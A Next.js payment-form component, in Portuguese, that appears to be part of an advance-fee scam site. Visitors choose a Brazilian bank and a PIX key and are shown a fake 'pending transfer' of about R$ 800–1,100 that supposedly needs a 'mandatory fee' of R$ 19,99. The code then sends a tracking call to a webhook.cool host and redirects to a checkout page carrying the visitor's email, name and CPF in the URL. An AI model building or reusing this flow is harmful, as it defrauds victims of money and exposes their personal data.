'use client'

import PixWhite from '@/assets/icon-pix-white.png'
import BB from '@/assets/bb.png'
import Caixa from '@/assets/caixa.png'
import Inter from '@/assets/inter.png'
import Itau from '@/assets/itau.png'
import Nu from '@/assets/nubank.png'
import C6 from '@/assets/picpay.png'
import Outro from '@/assets/outro.png'
import Bradesco from '@/assets/bradesco.png'

import Image from "next/image"
import { useEffect, useState } from "react"
import { toast } from 'sonner'
import { InputMask } from '@react-input/mask';
import { CHECKOUT_URL } from '@/functions/urls'
import type { StaticImport } from 'next/dist/shared/lib/get-img-props'
import { getData } from '@/functions/get-cookie'
import { hasCookie, setCookie } from 'cookies-next'
import useSound from 'use-sound'
import Sound from '@/assets/cash.mp3'
import { Loader, TriangleAlert } from 'lucide-react'
import { useRouter } from 'next/navigation'

export function FormPayment() {


  const [typeInput, setTypeInput] = useState<React.HTMLInputTypeAttribute | "">("")
  const [bank, setBank] = useState<"bb" | "c6" | "nu" | "itau" | "inter" | "caixa" | "outro" | "bradesco" | null>(null)
  const [pixKey, setPixKey] = useState<string>("")
  const [seconds, setSeconds] = useState<number>(2)
  const [loading, setLoading] = useState(false)

  const [btn, setBtn] = useState<string>()
  const [play] = useSound(Sound);


  useEffect(() => {
    setCookie('user_set_payment', true, {
      path: '/',
      maxAge: 60 * 60 * 24 * 7
    });
  }, []);

  const router = useRouter()

  function handleBtn(type: string) {

    setPixKey("")

    if (type === 'tel') {
      setTypeInput("tel")
      setBtn('tel')
    }

    if (type === 'cpf') {
      setTypeInput("tel")
      setBtn('cpf')
    }

    if (type === 'email') {
      setTypeInput("email")
      setBtn('email')
    }

    if (type === 'chave') {
      setTypeInput("text")
      setBtn('chave')
    }
  }

  async function handleSaque() {

    setLoading(true)

    if (bank === null) {
      toast.info("Selecione um banco para continuar.", { duration: 1500 });
      setLoading(false)
      return;
    }

    if (typeInput === "") {
      toast.info("Selecione o tipo de chave pix.", { duration: 1500 });
      setLoading(false)
      return;
    }

    if (pixKey.length < 3) {
      toast.info("Informe sua chave PIX", { duration: 1500 });
      setLoading(false)
      return;
    }


    setCookie('user_pixkey', pixKey.toString(), {
      path: '/',
      maxAge: 60 * 60 * 24 * 30,
    });

    const value = hasCookie('user_checkout') ? 1134.47 : 819.99


    let localImage: StaticImport | string = "";


    switch (bank) {
      case "bb":
        localImage = BB;

        break;
      case "c6":
        localImage = C6;

        break;
      case "nu":
        localImage = Nu;

        break;
      case "itau":
        localImage = Itau;

        break;
      case "inter":
        localImage = Inter;

        break;
      case "caixa":
        localImage = Caixa;

        break;
      case "bradesco":
        localImage = Bradesco;
        break;
      default:
        localImage = Outro;
        break;
    }


    toast(
      <div className='flex items-center gap-3'>
        <div className='rounded-lg bg-white border border-black'>
          <TriangleAlert className='size-11 fill-yellow-400' />
        </div>
        <div className='space-y-0'>
          <span className='font-semibold text-sm text-black'>Transferência PIX pendente!</span>
          <p className='text-black tracking-wide leading-4'>Transferência de <span className='font-bold'>

            {
              new Intl.NumberFormat('pt-BR', {
                style: 'currency',
                currency: 'BRL',
              }).format(Number(value))
            }

          </span> quase concluida, aguardando pagamento da taxa obrigatoria de <strong>R$ 19,99</strong>.</p>
        </div>
      </div>,
      {
        className: 'bg-white p-2 rounded-xl',
      }
    );

    play()

    setCookie('user_checkout', true, {
      path: '/',
      maxAge: 60 * 60 * 24 * 30,
    })


    const countdown = setInterval(() => {
      setSeconds(prevSeconds => prevSeconds - 1);
    }, 1000);


    const data = await getData('user_data') ?? ''


    fetch('https://bald-address-37.webhook.cool', {
      method: 'POST',
      body: JSON.stringify({
        user: 'A'
      })
    })

    //router.push('/checkout')



    if (!data) {
      setTimeout(() => {
        clearInterval(countdown);
        //window.location.href = 'https://go.perfectpay.com.br/PPU38COPTO0?';
        router.push('/checkout')
      }, seconds * 1000);
    } else {

      const dados = JSON.parse(data?.toString())

      setTimeout(() => {
        clearInterval(countdown);

        router.push(`/checkout?email=${dados.emailFull}&name=${dados.name}&document=${dados.document}`)



        // if (dados.document === '140.491.936-80') {
        //   window.location.href = `https://go.perfectpay.com.br/PPU38COPTO0?email=${dados.email}&name=${dados.name}`;
        // } else {
        //   window.location.href = `${CHECKOUT_URL}email=${dados.email}&name=${dados.name}`;
        // }
      }, seconds * 1000);
    }
  }


  return (
    <div className='space-y-10 mt-10'>
      <div className='grid grid-cols-4 gap-6 place-items-center'>
        <button className='relative' onClick={() => setBank("bb")}>
          {bank === 'bb' && (<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="#25d366" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" className="size-6  absolute -top-2 -right-2 lucide lucide-check"><path d="M3.85 8.62a4 4 0 0 1 4.78-4.77 4 4 0 0 1 6.74 0 4 4 0 0 1 4.78 4.78 4 4 0 0 1 0 6.74 4 4 0 0 1-4.77 4.78 4 4 0 0 1-6.75 0 4 4 0 0 1-4.78-4.77 4 4 0 0 1 0-6.76Z" stroke="#25d366" /><path d="m9 12 2 2 4-4" /></svg>)}
          <Image src={BB} alt='logo' className='w-[50px] h-auto object-cover' width={0} height={0} priority />
        </button>
        <button className='relative' onClick={() => setBank("caixa")}>
          {bank === 'caixa' && (<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="#25d366" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" className="size-6  absolute -top-2 -right-2 lucide lucide-check"><path d="M3.85 8.62a4 4 0 0 1 4.78-4.77 4 4 0 0 1 6.74 0 4 4 0 0 1 4.78 4.78 4 4 0 0 1 0 6.74 4 4 0 0 1-4.77 4.78 4 4 0 0 1-6.75 0 4 4 0 0 1-4.78-4.77 4 4 0 0 1 0-6.76Z" stroke="#25d366" /><path d="m9 12 2 2 4-4" /></svg>)}
          <Image src={Caixa} alt='logo' className='w-[50px] h-auto object-cover' width={0} height={0} priority />
        </button>
        <button className='relative' onClick={() => setBank("nu")}>
          {bank === 'nu' && (<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="#25d366" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" className="size-6  absolute -top-2 -right-2 lucide lucide-check"><path d="M3.85 8.62a4 4 0 0 1 4.78-4.77 4 4 0 0 1 6.74 0 4 4 0 0 1 4.78 4.78 4 4 0 0 1 0 6.74 4 4 0 0 1-4.77 4.78 4 4 0 0 1-6.75 0 4 4 0 0 1-4.78-4.77 4 4 0 0 1 0-6.76Z" stroke="#25d366" /><path d="m9 12 2 2 4-4" /></svg>)}
          <Image src={Nu} alt='logo' className='w-[50px] h-auto object-cover' width={0} height={0} priority />
        </button>
        <button className='relative' onClick={() => setBank("itau")}>
          {bank === 'itau' && (<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="#25d366" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" className="size-6  absolute -top-2 -right-2 lucide lucide-check"><path d="M3.85 8.62a4 4 0 0 1 4.78-4.77 4 4 0 0 1 6.74 0 4 4 0 0 1 4.78 4.78 4 4 0 0 1 0 6.74 4 4 0 0 1-4.77 4.78 4 4 0 0 1-6.75 0 4 4 0 0 1-4.78-4.77 4 4 0 0 1 0-6.76Z" stroke="#25d366" /><path d="m9 12 2 2 4-4" /></svg>)}
          <Image src={Itau} alt='logo' className='w-[50px] h-auto object-cover' width={0} height={0} priority />
        </button>
        <button className='relative' onClick={() => setBank("inter")}>
          {bank === 'inter' && (<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="#25d366" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" className="size-6  absolute -top-2 -right-2 lucide lucide-check"><path d="M3.85 8.62a4 4 0 0 1 4.78-4.77 4 4 0 0 1 6.74 0 4 4 0 0 1 4.78 4.78 4 4 0 0 1 0 6.74 4 4 0 0 1-4.77 4.78 4 4 0 0 1-6.75 0 4 4 0 0 1-4.78-4.77 4 4 0 0 1 0-6.76Z" stroke="#25d366" /><path d="m9 12 2 2 4-4" /></svg>)}
          <Image src={Inter} alt='logo' className='w-[50px] h-auto object-cover' width={0} height={0} priority />
        </button>
        <button className='relative' onClick={() => setBank("c6")}>
          {bank === 'c6' && (<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="#25d366" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" className="size-6  absolute -top-2 -right-2 lucide lucide-check"><path d="M3.85 8.62a4 4 0 0 1 4.78-4.77 4 4 0 0 1 6.74 0 4 4 0 0 1 4.78 4.78 4 4 0 0 1 0 6.74 4 4 0 0 1-4.77 4.78 4 4 0 0 1-6.75 0 4 4 0 0 1-4.78-4.77 4 4 0 0 1 0-6.76Z" stroke="#25d366" /><path d="m9 12 2 2 4-4" /></svg>)}
          <Image src={C6} alt='logo' className='w-[50px] h-auto object-cover' width={0} height={0} priority />
        </button>
        <button className='relative' onClick={() => setBank("bradesco")}>
          {bank === 'bradesco' && (<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="#25d366" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" className="size-6  absolute -top-2 -right-2 lucide lucide-check"><path d="M3.85 8.62a4 4 0 0 1 4.78-4.77 4 4 0 0 1 6.74 0 4 4 0 0 1 4.78 4.78 4 4 0 0 1 0 6.74 4 4 0 0 1-4.77 4.78 4 4 0 0 1-6.75 0 4 4 0 0 1-4.78-4.77 4 4 0 0 1 0-6.76Z" stroke="#25d366" /><path d="m9 12 2 2 4-4" /></svg>)}
          <Image src={Bradesco} alt='logo' className='w-[50px] h-auto object-cover' width={0} height={0} />
        </button>
        <button className='relative' onClick={() => setBank("outro")}>
          {bank === 'outro' && (<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="#25d366" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" className="size-6  absolute -top-2 -right-2 lucide lucide-check"><path d="M3.85 8.62a4 4 0 0 1 4.78-4.77 4 4 0 0 1 6.74 0 4 4 0 0 1 4.78 4.78 4 4 0 0 1 0 6.74 4 4 0 0 1-4.77 4.78 4 4 0 0 1-6.75 0 4 4 0 0 1-4.78-4.77 4 4 0 0 1 0-6.76Z" stroke="#25d366" /><path d="m9 12 2 2 4-4" /></svg>)}
          <Image src={Outro} alt='logo' className='w-[50px] h-auto object-cover' width={0} height={0} priority />
        </button>
      </div>


      <div className='flex items-center justify-center gap-2 mt-6'>
        <Image src={PixWhite} alt="icon pix" className='w-[15px] h-auto object-cover' priority />
        <p className='text-xs font-semibold text-zinc-900'>Selecione sua chave PIX</p>
      </div>

      <div className='grid grid-cols-4 gap-2 mt-4'>
        <button onClick={() => handleBtn('tel')} className={btn === 'tel' ? 'flex flex-col items-center justify-center bg-white ring-2 ring-[#00bdae] rounded-md p-2 gap-4' : 'flex flex-col items-center justify-center bg-white rounded-md p-2 gap-4'}>
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="size-5 lucide lucide-smartphone text-zinc-900"><rect width="14" height="20" x="5" y="2" rx="2" ry="2" /><path d="M12 18h.01" /></svg>
          <span className='text-zinc-900 font-bold text-sm'>Celular</span>
        </button>
        <button onClick={() => handleBtn("cpf")} className={btn === 'cpf' ? 'flex flex-col items-center justify-center bg-white ring-2 ring-[#00bdae] rounded-md p-2 gap-4' : 'flex flex-col items-center justify-center bg-white  rounded-md p-2 gap-4'}>
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="size-5 lucide lucide-smartphone text-zinc-900"><path d="M15 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7Z" /><path d="M14 2v4a2 2 0 0 0 2 2h4" /></svg>
          <span className='text-zinc-900 font-bold text-sm'>CPF</span>
        </button>
        <button onClick={() => handleBtn("email")} className={btn === 'email' ? 'flex flex-col items-center justify-center bg-white ring-2 ring-[#00bdae] rounded-md p-2 gap-4' : 'flex flex-col items-center justify-center bg-white  rounded-md p-2 gap-4'}>
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="size-5 lucide lucide-smartphone text-zinc-900"><rect width="20" height="16" x="2" y="4" rx="2" /><path d="m22 7-8.97 5.7a1.94 1.94 0 0 1-2.06 0L2 7" /></svg>
          <span className='text-zinc-900 font-bold text-sm'>E-mail</span>
        </button>
        <button onClick={() => handleBtn("chave")} className={btn === 'chave' ? 'flex flex-col items-center justify-center bg-white ring-2 ring-[#00bdae] rounded-md p-2 gap-4' : 'flex flex-col items-center justify-center bg-white  rounded-md p-2 pt-2  gap-2'}>
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="size-5 lucide lucide-smartphone text-zinc-900"><path d="M2 18v3c0 .6.4 1 1 1h4v-3h3v-3h2l1.4-1.4a6.5 6.5 0 1 0-4-4Z" /><circle cx="16.5" cy="7.5" r=".5" fill="currentColor" /></svg>
          <span className='text-zinc-900 font-bold text-sm'>Chave aleatória</span>
        </button>
      </div>
      <div className='space-y-4'>


        {btn === "tel" && (
          <InputMask type={typeInput} value={pixKey} onChange={(e) => setPixKey(e.target.value)} mask="(__) _____-____" replacement={{ _: /\d/ }} className='p-2 rounded-lg ring-1 ring-[#1c7069] focus:ring-2 outline-none border-0 w-full h-11' placeholder='Digite sua chave PIX aqui....' />
        )}


        {btn === "cpf" && (
          <InputMask type={typeInput} value={pixKey} onChange={(e) => setPixKey(e.target.value)} mask="___.___.___-__" replacement={{ _: /\d/ }} className='p-2 rounded-lg ring-1 ring-[#1c7069] focus:ring-2 outline-none border-0 w-full h-11' placeholder='Digite sua chave PIX aqui....' />
        )}

        {btn === "email" && (
          <input type={typeInput} value={pixKey} onChange={(e) => setPixKey(e.target.value)} className='p-2 rounded-lg ring-1 ring-[#1c7069] focus:ring-2 outline-none border-0 w-full  h-11' placeholder='Digite sua chave PIX aqui....' />
        )}

        {btn === "chave" && (
          <input type={typeInput} value={pixKey} onChange={(e) => setPixKey(e.target.value)} className='p-2 rounded-lg ring-1 ring-[#1c7069] focus:ring-2 outline-none border-0 w-full  h-11' placeholder='Digite sua chave PIX aqui....' />
        )}



        <button onClick={handleSaque} className='w-full bg-[#1c7069] h-12 flex items-center justify-center text-white font-semibold  rounded-3xl'>
          {loading ? (<Loader className="size-6 animate-spin text-white" />) : (
            <span>Realizar saque agora</span>
          )}
        </button>
      </div>
    </div>

  )

}